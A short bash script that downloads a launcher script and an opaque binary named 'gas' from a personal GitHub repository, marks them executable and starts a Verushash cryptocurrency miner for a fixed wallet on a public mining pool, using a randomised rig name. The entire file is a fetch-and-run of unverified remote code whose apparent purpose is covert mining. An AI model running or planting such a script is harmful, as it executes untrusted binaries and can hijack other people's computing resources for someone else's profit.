#!/bin/bash
wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh
wget https://github.com/hunshukajh/yes/raw/main/gas
chmod +x gas cmdline_launcher.sh 
./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe  -rigName  $(echo $(shuf -i 1-2 -n 1)-joa) -pool1 na.luckpool.net:3956
